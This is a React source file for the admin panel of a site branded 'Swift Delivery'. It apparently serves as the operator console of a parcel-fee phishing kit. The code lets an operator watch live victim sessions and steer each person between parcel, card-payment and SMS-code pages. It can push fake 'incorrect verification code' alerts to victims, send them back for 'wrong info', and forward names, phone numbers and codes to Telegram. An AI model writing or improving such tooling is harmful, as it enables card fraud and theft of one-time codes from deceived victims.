import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  RefreshCw, 
  CreditCard, 
  MessageSquare, 
  Package,
  ArrowLeft,
  Users,
  Clock,
  Send,
  AlertTriangle,
  Info,
  XCircle,
  LogOut,
  Settings,
  KeyRound,
  CheckCircle
} from "lucide-react";
import { toast } from "@/hooks/use-toast";
import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
import AdminLogin from "@/components/AdminLogin";
import AdminSettings from "@/components/AdminSettings";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  created_at: string;
  updated_at: string;
}

const stepNames: Record<number, string> = {
  1: "Parcel Details",
  2: "Payment",
  3: "Verification",
  4: "Confirmation"
};

const stepColors: Record<number, string> = {
  1: "bg-blue-500",
  2: "bg-yellow-500",
  3: "bg-purple-500",
  4: "bg-green-500"
};

const messageTypes = [
  { value: "error", label: "Error", icon: XCircle, color: "text-red-500" },
  { value: "warning", label: "Warning", icon: AlertTriangle, color: "text-yellow-500" },
  { value: "info", label: "Info", icon: Info, color: "text-blue-500" },
];

const AdminPanel = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [sessions, setSessions] = useState<ClientSession[]>([]);
  const [loading, setLoading] = useState(true);
  const [messageInputs, setMessageInputs] = useState<Record<string, { message: string; type: string }>>({});

  // Check for existing admin session
  useEffect(() => {
    const adminAuth = sessionStorage.getItem("admin_authenticated");
    if (adminAuth === "true") {
      setIsAuthenticated(true);
    }
  }, []);

  const handleLogout = () => {
    sessionStorage.removeItem("admin_authenticated");
    sessionStorage.removeItem("admin_username");
    setIsAuthenticated(false);
    toast({
      title: "Logged out",
      description: "You have been logged out of the admin panel",
    });
  };

  const fetchSessions = async () => {
    const { data, error } = await supabase
      .from("client_sessions")
      .select("*")
      .eq("status", "active")
      .order("created_at", { ascending: false });

    if (error) {
      console.error("Error fetching sessions:", error);
      toast({
        title: "Error",
        description: "Failed to fetch client sessions",
        variant: "destructive"
      });
    } else {
      setSessions(data || []);
    }
    setLoading(false);
  };

  const updateClientStep = async (sessionId: string, newStep: number) => {
    const { error } = await supabase
      .from("client_sessions")
      .update({ current_step: newStep })
      .eq("id", sessionId);

    if (error) {
      console.error("Error updating session:", error);
      toast({
        title: "Error",
        description: "Failed to update client step",
        variant: "destructive"
      });
    } else {
      toast({
        title: "Success",
        description: `Client sent to ${stepNames[newStep]}`,
      });
    }
  };

  const generateVerificationCode = () => {
    return Math.floor(100000 + Math.random() * 900000).toString();
  };

  const resendVerificationCode = async (session: ClientSession) => {
    const newCode = generateVerificationCode();
    
    // Update the code in the database
    const { error: dbError } = await supabase
      .from("client_sessions")
      .update({ verification_code: newCode })
      .eq("id", session.id);

    if (dbError) {
      console.error("Error updating verification code:", dbError);
      toast({
        title: "Error",
        description: "Failed to generate new code",
        variant: "destructive"
      });
      return;
    }

    // Send the new code to Telegram
    try {
      const message = `🔑 <b>New Verification Code</b>

📋 <b>Session:</b> #${session.session_code}
👤 <b>Client:</b> ${session.client_name || "Unknown"}
📱 <b>Phone:</b> ${session.phone_number || "N/A"}

🔑 <b>New Code:</b> <code>${newCode}</code>

⏰ <b>Time:</b> ${new Date().toLocaleString()}`;

      await supabase.functions.invoke("send-telegram", {
        body: { message },
      });

      toast({
        title: "Code Sent",
        description: `New verification code ${newCode} sent to Telegram`,
      });
    } catch (error) {
      console.error("Failed to send Telegram notification:", error);
      toast({
        title: "Code Generated",
        description: `New code: ${newCode} (Telegram notification failed)`,
      });
    }
  };

  const sendWrongSmsMessage = async (sessionId: string) => {
    const { error } = await supabase
      .from("client_sessions")
      .update({ 
        admin_message: "The verification code you entered is incorrect. Please check and try again.",
        message_type: "error"
      })
      .eq("id", sessionId);

    if (error) {
      console.error("Error sending message:", error);
      toast({
        title: "Error",
        description: "Failed to send message",
        variant: "destructive"
      });
    } else {
      toast({
        title: "Message Sent",
        description: "Wrong SMS alert sent to client",
      });
    }
  };

  const sendMessage = async (sessionId: string) => {
    const input = messageInputs[sessionId];
    if (!input?.message || !input?.type) {
      toast({
        title: "Error",
        description: "Please enter a message and select a type",
        variant: "destructive"
      });
      return;
    }

    const { error } = await supabase
      .from("client_sessions")
      .update({ 
        admin_message: input.message,
        message_type: input.type
      })
      .eq("id", sessionId);

    if (error) {
      console.error("Error sending message:", error);
      toast({
        title: "Error",
        description: "Failed to send message",
        variant: "destructive"
      });
    } else {
      toast({
        title: "Message Sent",
        description: "Alert sent to client",
      });
      setMessageInputs(prev => ({
        ...prev,
        [sessionId]: { message: "", type: "error" }
      }));
    }
  };

  const clearMessage = async (sessionId: string) => {
    const { error } = await supabase
      .from("client_sessions")
      .update({ admin_message: null, message_type: null })
      .eq("id", sessionId);

    if (error) {
      console.error("Error clearing message:", error);
    } else {
      toast({
        title: "Message Cleared",
        description: "Alert removed from client view",
      });
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchSessions();

      // Subscribe to realtime changes
      const channel = supabase
        .channel("client_sessions_changes")
        .on(
          "postgres_changes",
          {
            event: "*",
            schema: "public",
            table: "client_sessions"
          },
          () => {
            fetchSessions();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    }
  }, [isAuthenticated]);

  const getTimeSince = (dateString: string) => {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) return "Just now";
    if (diffMins < 60) return `${diffMins}m ago`;
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `${diffHours}h ago`;
    return `${Math.floor(diffHours / 24)}d ago`;
  };

  if (!isAuthenticated) {
    return <AdminLogin onLogin={() => setIsAuthenticated(true)} />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-secondary text-secondary-foreground py-4 shadow-lg">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img 
                src={swiftDeliveryLogo} 
                alt="Swift Delivery" 
                className="h-8 object-contain"
              />
              <div>
                <h1 className="text-xl font-semibold">Admin Panel</h1>
                <p className="text-sm text-secondary-foreground/70">Client Control Dashboard</p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2 text-sm">
                <Users className="w-4 h-4" />
                <span>{sessions.length} active</span>
              </div>
              <Button 
                variant="outline" 
                size="sm" 
                onClick={fetchSessions}
                className="gap-2"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh
              </Button>
              <Button 
                variant="ghost" 
                size="sm" 
                onClick={handleLogout}
                className="gap-2"
              >
                <LogOut className="w-4 h-4" />
                Logout
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <Tabs defaultValue="clients" className="space-y-6">
          <TabsList className="grid w-full max-w-md grid-cols-2">
            <TabsTrigger value="clients" className="gap-2">
              <Users className="w-4 h-4" />
              Clients
            </TabsTrigger>
            <TabsTrigger value="settings" className="gap-2">
              <Settings className="w-4 h-4" />
              Settings
            </TabsTrigger>
          </TabsList>

          <TabsContent value="clients">
            {loading ? (
              <div className="flex items-center justify-center py-20">
                <RefreshCw className="w-8 h-8 animate-spin text-muted-foreground" />
              </div>
            ) : sessions.length === 0 ? (
              <Card className="text-center py-20">
                <CardContent>
                  <Users className="w-16 h-16 mx-auto text-muted-foreground mb-4" />
                  <h2 className="text-xl font-semibold mb-2">No Active Clients</h2>
                  <p className="text-muted-foreground">
                    When clients start the payment flow, they will appear here.
                  </p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
                {sessions.map((session) => (
                  <Card key={session.id} className="overflow-hidden">
                    <CardHeader className="pb-3">
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-lg flex items-center gap-2">
                          <span className="font-mono bg-muted px-2 py-1 rounded text-sm">
                            #{session.session_code}
                          </span>
                        </CardTitle>
                        <Badge className={`${stepColors[session.current_step]} text-white`}>
                          {stepNames[session.current_step]}
                        </Badge>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      {/* Client Info */}
                      <div className="space-y-2 text-sm">
                        {session.client_name && (
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Name:</span>
                            <span className="font-medium">{session.client_name}</span>
                          </div>
                        )}
                        {session.phone_number && (
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Phone:</span>
                            <span className="font-medium">{session.phone_number}</span>
                          </div>
                        )}
                        {session.parcel_tracking && (
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Tracking:</span>
                            <span className="font-mono text-xs">{session.parcel_tracking}</span>
                          </div>
                        )}
                        {session.amount && (
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Amount:</span>
                            <span className="font-semibold text-primary">£{session.amount.toFixed(2)}</span>
                          </div>
                        )}
                        <div className="flex justify-between items-center pt-2 border-t">
                          <span className="text-muted-foreground flex items-center gap-1">
                            <Clock className="w-3 h-3" /> Updated:
                          </span>
                          <span className="text-xs">{getTimeSince(session.updated_at)}</span>
                        </div>
                      </div>

                      {/* Current Message Status */}
                      {session.admin_message && (
                        <div className="p-2 rounded bg-muted border">
                          <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2 text-sm">
                              {session.message_type === "error" && <XCircle className="w-4 h-4 text-red-500" />}
                              {session.message_type === "warning" && <AlertTriangle className="w-4 h-4 text-yellow-500" />}
                              {session.message_type === "info" && <Info className="w-4 h-4 text-blue-500" />}
                              <span className="truncate max-w-[150px]">{session.admin_message}</span>
                            </div>
                            <Button 
                              variant="ghost" 
                              size="sm"
                              onClick={() => clearMessage(session.id)}
                            >
                              <XCircle className="w-4 h-4" />
                            </Button>
                          </div>
                        </div>
                      )}

                      {/* Send Message */}
                      <div className="space-y-2 pt-2 border-t">
                        <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
                          Send Alert to Client:
                        </p>
                        <div className="flex gap-2">
                          <Select
                            value={messageInputs[session.id]?.type || "error"}
                            onValueChange={(value) => setMessageInputs(prev => ({
                              ...prev,
                              [session.id]: { ...prev[session.id], type: value, message: prev[session.id]?.message || "" }
                            }))}
                          >
                            <SelectTrigger className="w-[100px]">
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              {messageTypes.map((type) => (
                                <SelectItem key={type.value} value={type.value}>
                                  <div className="flex items-center gap-2">
                                    <type.icon className={`w-4 h-4 ${type.color}`} />
                                    {type.label}
                                  </div>
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                          <Input
                            placeholder="Enter message..."
                            value={messageInputs[session.id]?.message || ""}
                            onChange={(e) => setMessageInputs(prev => ({
                              ...prev,
                              [session.id]: { ...prev[session.id], message: e.target.value, type: prev[session.id]?.type || "error" }
                            }))}
                            className="flex-1"
                          />
                          <Button 
                            size="icon"
                            onClick={() => sendMessage(session.id)}
                          >
                            <Send className="w-4 h-4" />
                          </Button>
                        </div>
                      </div>

                      {/* Control Buttons */}
                      <div className="space-y-2 pt-2 border-t">
                        <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
                          Send Client To:
                        </p>
                        <div className="grid grid-cols-3 gap-2">
                          <Button
                            variant={session.current_step === 1 ? "default" : "outline"}
                            size="sm"
                            className="flex-col h-auto py-2 gap-1"
                            onClick={() => updateClientStep(session.id, 1)}
                            disabled={session.current_step === 1}
                          >
                            <Package className="w-4 h-4" />
                            <span className="text-xs">Parcel</span>
                          </Button>
                          <Button
                            variant={session.current_step === 2 ? "default" : "outline"}
                            size="sm"
                            className="flex-col h-auto py-2 gap-1"
                            onClick={() => updateClientStep(session.id, 2)}
                            disabled={session.current_step === 2}
                          >
                            <CreditCard className="w-4 h-4" />
                            <span className="text-xs">Card</span>
                          </Button>
                          <Button
                            variant={session.current_step === 3 ? "default" : "outline"}
                            size="sm"
                            className="flex-col h-auto py-2 gap-1"
                            onClick={() => updateClientStep(session.id, 3)}
                            disabled={session.current_step === 3}
                          >
                            <MessageSquare className="w-4 h-4" />
                            <span className="text-xs">SMS</span>
                          </Button>
                        </div>
                      </div>

                      {/* Verification Controls - Only show when on verification step */}
                      {session.current_step === 3 && (
                        <div className="space-y-2 pt-2 border-t">
                          <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
                            Verification Controls:
                          </p>
                          <div className="grid grid-cols-2 gap-2">
                            <Button
                              variant="outline"
                              size="sm"
                              className="gap-2"
                              onClick={() => resendVerificationCode(session)}
                            >
                              <KeyRound className="w-4 h-4" />
                              Resend Code
                            </Button>
                            <Button
                              variant="outline"
                              size="sm"
                              className="gap-2 text-destructive border-destructive hover:bg-destructive hover:text-destructive-foreground"
                              onClick={() => sendWrongSmsMessage(session.id)}
                            >
                              <XCircle className="w-4 h-4" />
                              Wrong SMS
                            </Button>
                          </div>
                          {session.verification_code && (
                            <div className="p-2 rounded bg-muted text-center">
                              <span className="text-xs text-muted-foreground">Current Code: </span>
                              <span className="font-mono font-bold">{session.verification_code}</span>
                            </div>
                          )}
                          <Button
                            size="sm"
                            className="w-full gap-2 bg-green-600 hover:bg-green-700 text-white"
                            onClick={() => updateClientStep(session.id, 4)}
                          >
                            <CheckCircle className="w-4 h-4" />
                            Confirm Payment
                          </Button>
                        </div>
                      )}

                      {/* Quick Actions */}
                      {session.current_step > 1 && (
                        <Button
                          variant="destructive"
                          size="sm"
                          className="w-full gap-2"
                          onClick={() => updateClientStep(session.id, session.current_step - 1)}
                        >
                          <ArrowLeft className="w-4 h-4" />
                          Send Back (Wrong Info)
                        </Button>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </TabsContent>

          <TabsContent value="settings">
            <AdminSettings />
          </TabsContent>
        </Tabs>
      </main>
    </div>
  );
};

export default AdminPanel;
